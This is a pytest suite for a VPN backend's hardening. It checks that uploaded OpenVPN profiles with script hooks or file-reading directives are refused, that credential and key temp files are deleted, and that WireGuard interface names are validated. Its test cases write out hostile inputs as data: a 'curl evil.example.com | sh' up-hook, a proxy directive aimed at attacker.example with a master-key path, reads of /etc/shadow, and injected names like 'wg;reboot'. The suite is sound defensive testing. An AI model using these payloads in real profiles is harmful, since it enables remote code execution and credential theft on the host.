"""Tests for VPN backend correctness and hardening.

Covers three defects: uploaded OpenVPN profiles could execute programs on the
host, their temp files (including a plaintext `username\\npassword` auth file)
were never deleted, and WireGuard reported an interface name that never
matched the one wg-quick actually created.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from app.core.exceptions import ValidationError
from app.services.vpn_backends import openvpn, wireguard

# Any 32 bytes, base64-encoded the way wg prints a key.
_WG_KEY = "AAECAwQFBgcICQoLDA0ODxAREhMUFRYXGBkaGxwdHh8="


@pytest.fixture(autouse=True)
def _clean_backend_state():
    openvpn._processes.clear()
    openvpn._tempfiles.clear()
    yield
    for tag in list(openvpn._tempfiles):
        openvpn._cleanup_tempfiles(tag)
    openvpn._processes.clear()


# ---------------------------------------------------------------------------
# OpenVPN: script directives
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "directive",
    [
        "up /bin/sh -c 'curl evil.example.com | sh'",
        "down /tmp/x.sh",
        "script-security 2",
        "plugin /usr/lib/openvpn/plugin.so",
        "client-connect /tmp/hook.sh",
        "learn-address /tmp/hook.sh",
        "tls-verify /tmp/hook.sh",
        "auth-user-pass-verify /tmp/hook.sh via-file",
    ],
)
async def test_openvpn_refuses_configs_that_can_execute_programs(directive):
    config = {"config_content": f"client\nremote vpn.example.com 1194\n{directive}\n"}
    result = await openvpn.connect(config, tag="t1")
    assert result["ok"] is False
    assert "kjøre vilkårlige kommandoer" in result["error"]


async def test_openvpn_accepts_an_ordinary_profile_shape():
    """A clean profile must pass the directive check (it fails later, on exec)."""
    content = "client\ndev tun\nproto udp\nremote vpn.example.com 1194\n"
    assert openvpn._reject_script_directives(content) is None


@pytest.mark.parametrize(
    "line",
    [
        "remote-random",
        "up-delay 10",  # legitimate option, not a script hook
        "up-restart",
        "down-pre",  # only reorders the down script; `down` itself is blocked
        "keepalive 10 120",
    ],
)
def test_directive_check_does_not_fire_on_lookalikes(line):
    assert openvpn._reject_script_directives(f"client\n{line}\n") is None


@pytest.mark.parametrize(
    ("line", "expected"),
    [
        ("up /tmp/x", "up"),
        ("  up /tmp/x", "up"),  # leading whitespace
        ("route-up /tmp/x", "route-up"),  # longest match wins over 'up'
        ("DOWN /tmp/x", "DOWN"),  # directives are case-insensitive
        ("script-security 2", "script-security"),
    ],
)
def test_directive_check_catches_real_hooks(line, expected):
    assert openvpn._reject_script_directives(f"client\n{line}\n") == expected


async def test_openvpn_rejects_an_empty_config():
    assert (await openvpn.connect({}, tag="t1"))["ok"] is False


# ---------------------------------------------------------------------------
# OpenVPN: temp file hygiene
# ---------------------------------------------------------------------------


async def test_openvpn_removes_temp_files_when_the_binary_is_missing(monkeypatch):
    """Regression: config and credential files were left in /tmp forever."""

    async def _no_openvpn(*a, **kw):
        raise FileNotFoundError("openvpn")

    monkeypatch.setattr(openvpn.asyncio, "create_subprocess_exec", _no_openvpn)

    result = await openvpn.connect(
        {
            "config_content": "client\nremote vpn.example.com 1194\n",
            "username": "user",
            "password": "s3cret",
        },
        tag="t1",
    )
    assert result["ok"] is False
    assert openvpn._tempfiles.get("t1") in (None, [])


async def test_openvpn_credentials_never_linger_after_disconnect(monkeypatch, tmp_path):
    """The auth file holds a plaintext password — it must not survive."""
    captured: dict = {}

    class _FakeProc:
        returncode = None

        def kill(self):
            self.returncode = -9

        def terminate(self):
            self.returncode = -15

        async def wait(self):
            return self.returncode

    async def _fake_exec(*cmd, **kw):
        captured["cmd"] = cmd
        return _FakeProc()

    monkeypatch.setattr(openvpn.asyncio, "create_subprocess_exec", _fake_exec)
    monkeypatch.setattr(openvpn.asyncio, "sleep", lambda _: _noop())

    result = await openvpn.connect(
        {
            "config_content": "client\nremote vpn.example.com 1194\n",
            "username": "user",
            "password": "s3cret",
        },
        tag="t1",
    )
    assert result["ok"] is True

    paths = list(openvpn._tempfiles["t1"])
    auth = [p for p in paths if p.name == "auth.txt"]
    assert auth and auth[0].exists()
    assert "s3cret" in auth[0].read_text()
    # Private directory, owner-only file.
    assert auth[0].stat().st_mode & 0o077 == 0
    workdir = auth[0].parent

    await openvpn.disconnect("t1")

    assert not auth[0].exists()
    assert not workdir.exists()


async def _noop():
    return None


async def test_openvpn_pins_script_security_off(monkeypatch):
    """--script-security 0 is passed after --config so a profile can't raise it."""
    captured: dict = {}

    class _FakeProc:
        returncode = None

        async def wait(self):
            return None

    async def _fake_exec(*cmd, **kw):
        captured["cmd"] = list(cmd)
        return _FakeProc()

    monkeypatch.setattr(openvpn.asyncio, "create_subprocess_exec", _fake_exec)
    monkeypatch.setattr(openvpn.asyncio, "sleep", lambda _: _noop())

    await openvpn.connect({"config_content": "client\nremote a.example.com 1194\n"}, tag="t1")

    cmd = captured["cmd"]
    assert "--script-security" in cmd
    assert cmd[cmd.index("--script-security") + 1] == "0"
    assert cmd.index("--script-security") > cmd.index("--config")


# ---------------------------------------------------------------------------
# WireGuard: interface naming
# ---------------------------------------------------------------------------


async def test_wireguard_config_is_named_after_the_interface(monkeypatch):
    """Regression: wg-quick names the interface after the config *filename*.

    A random tempfile name produced an interface nobody could later find, so
    disconnect silently failed and the tunnel stayed up.
    """
    seen: dict = {}

    async def _fake_run(cmd, timeout=30):
        if cmd[:1] == ["which"]:
            return 0, "/usr/bin/wg-quick", ""
        if "wg-quick" in cmd and "up" in cmd:
            conf = Path(cmd[-1])
            seen["conf_name"] = conf.name
            seen["mode"] = conf.stat().st_mode & 0o777
            seen["content"] = conf.read_text()
            return 0, "", ""
        return 0, "", ""

    monkeypatch.setattr(wireguard, "_run", _fake_run)

    result = await wireguard._connect_direct(
        {"addresses": ["10.0.0.2/32"], "private_key": _WG_KEY, "peers": []},
        "wg-a1b2c3d4",
    )
    assert result == {"ok": True, "interface": "wg-a1b2c3d4"}
    # The filename determines the real interface name — they must agree.
    assert seen["conf_name"] == "wg-a1b2c3d4.conf"
    assert seen["mode"] == 0o600  # holds the private key
    assert f"PrivateKey = {_WG_KEY}" in seen["content"]


async def test_wireguard_removes_the_config_containing_the_private_key(monkeypatch):
    captured: dict = {}

    async def _fake_run(cmd, timeout=30):
        if cmd[:1] == ["which"]:
            return 0, "", ""
        if "up" in cmd:
            captured["path"] = Path(cmd[-1])
        return 0, "", ""

    monkeypatch.setattr(wireguard, "_run", _fake_run)
    await wireguard._connect_direct({"private_key": _WG_KEY, "peers": []}, "wg-test0")
    assert not captured["path"].exists()
    assert not captured["path"].parent.exists()


@pytest.mark.parametrize("iface", ["../../etc/passwd", "a b", "wg;reboot", ""])
async def test_wireguard_rejects_bad_interface_names(iface, monkeypatch):
    async def _fake_run(cmd, timeout=30):
        return 0, "", ""

    monkeypatch.setattr(wireguard, "_run", _fake_run)
    with pytest.raises(ValidationError):
        await wireguard._connect_direct({"private_key": _WG_KEY}, iface)


async def test_wireguard_requires_a_private_key():
    with pytest.raises(ValidationError):
        wireguard._build_conf({"addresses": ["10.0.0.2/32"]})


# ---------------------------------------------------------------------------
# OpenVPN: directives that reach the hub's filesystem
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "line",
    [
        "config /etc/sybr-hub/settings.json",
        "auth-user-pass /var/lib/sybr-hub/key.backup",
        "http-proxy proxy.example 8080 /etc/passwd basic",
        "socks-proxy proxy.example 1080 /etc/passwd",
        "ca /etc/sybr-hub-secrets/key-wrap.secret",
        "key /var/lib/sybr-hub/master.key",
        "tls-crypt /etc/shadow",
        "status /var/lib/sybr-hub/status.log",
        "writepid /opt/sybr-hub/main.py",
        "log-append /tmp/x",
        "management 127.0.0.1 7505",
        "iproute /tmp/fake-ip",
        "cd /",
        "CONFIG /tmp/x",  # case-insensitive, like OpenVPN
    ],
)
async def test_openvpn_refuses_directives_that_touch_hub_files(line):
    content = f"client\nremote vpn.example.com 1194\n{line}\n"
    assert openvpn._reject_file_directives(content) == line.split()[0]
    result = await openvpn.connect({"config_content": content}, tag="t1")
    assert result["ok"] is False
    assert "lese eller skrive filer" in result["error"]


@pytest.mark.parametrize(
    "line",
    [
        "auth-user-pass",  # credentials come from the hub's own temp file
        "ca [inline]",
        "http-proxy proxy.example 8080",
        "http-proxy proxy.example 8080 auto",
        "socks-proxy proxy.example 1080",
        "# config /etc/passwd",
        "; status /tmp/x",
    ],
)
def test_ordinary_lines_pass_the_file_directive_check(line):
    assert openvpn._reject_file_directives(f"client\n{line}\n") is None


def test_inline_blocks_are_not_read_as_directives():
    content = "client\n<key>\nlog\nconfig /etc/passwd\n</key>\nremote vpn.example.com 1194\n"
    assert openvpn._reject_file_directives(content) is None


async def test_connect_never_reads_a_server_side_config_file(tmp_path):
    target = tmp_path / "secret.conf"
    target.write_text("client\nremote vpn.example.com 1194\n")
    result = await openvpn.connect({"config_file": str(target)}, tag="t1")
    assert result == {"ok": False, "error": "No OpenVPN config provided"}


# ---------------------------------------------------------------------------
# OpenVPN: the profile is parsed as OpenVPN parses it, against an allowlist
# ---------------------------------------------------------------------------

_REAL_PROFILE = """\
# Exported by a FortiGate / OpenVPN Access Server style tool
client
dev tun
proto udp
nobind
persist-key
persist-tun
remote-cert-tls server
verify-x509-name vpn.example.com name
data-ciphers AES-256-GCM:AES-128-GCM
auth SHA256
auth-user-pass
auth-nocache
resolv-retry infinite
keepalive 10 60
setenv opt block-outside-dns
verb 3
<connection>
remote vpn.example.com 1194 udp
</connection>
<connection>
remote vpn.example.com 443 tcp
http-proxy proxy.example 8080 auto
</connection>
<ca>
-----BEGIN CERTIFICATE-----
MIIB
-----END CERTIFICATE-----
</ca>
<tls-crypt>
-----BEGIN OpenVPN Static key V1-----
abcd
-----END OpenVPN Static key V1-----
</tls-crypt>
"""


def test_a_real_world_profile_is_accepted():
    assert openvpn.refusal_reason(_REAL_PROFILE) is None


@pytest.mark.parametrize(
    ("content", "offending"),
    [
        # The old filter skipped everything between any <tag> and </tag>.
        (
            "client\n<connection>\nremote vpn.example.com 443 tcp\n"
            "http-proxy attacker.example 8080 /var/lib/sybr-hub/.master_key_backup basic\n"
            "</connection>\n",
            "http-proxy",
        ),
        (
            "client\n<connection>\nstatus /var/lib/sybr-hub/msp_toolkit.db\n</connection>\n",
            "status",
        ),
        # OpenVPN strips the quotes; the name it acts on is `status`.
        ('client\n"status" /var/lib/sybr-hub/msp_toolkit.db\n', "status"),
        ("client\n'writepid' /opt/sybr-hub/main.py\n", "writepid"),
        ("client\n--config /etc/sybr-hub/settings.json\n", "config"),
    ],
)
def test_file_directives_are_found_wherever_openvpn_would_read_them(content, offending):
    assert openvpn._reject_file_directives(content) == offending
    assert "lese eller skrive filer" in openvpn.refusal_reason(content)


def test_a_quoted_script_hook_is_refused():
    assert openvpn._reject_script_directives('client\n"up" /tmp/x.sh\n') == "up"


@pytest.mark.parametrize(
    ("content", "offending"),
    [
        ("client\ndev-node /dev/net/other\n", "dev-node"),
        ("client\ntls-export-cert /tmp/certs\n", "tls-export-cert"),
        ("client\n<script>\nwhatever\n</script>\n", "<script>"),
        ("client\n<ca>\n-----BEGIN CERTIFICATE-----\n", "<ca>"),  # never closed
        ("client\n<connection>\nremote a.example 1194\n", "<connection>"),
        ("client\n<connection>\n<connection>\n</connection>\n</connection>\n", "<connection>"),
        ('client\nremote "unterminated 1194\n', 'remote "unterminated 1194'),
    ],
)
def test_anything_outside_the_allowlist_is_refused(content, offending):
    assert openvpn._reject_unknown_directives(content) == offending
    assert "godtar i en klientprofil" in openvpn.refusal_reason(content)
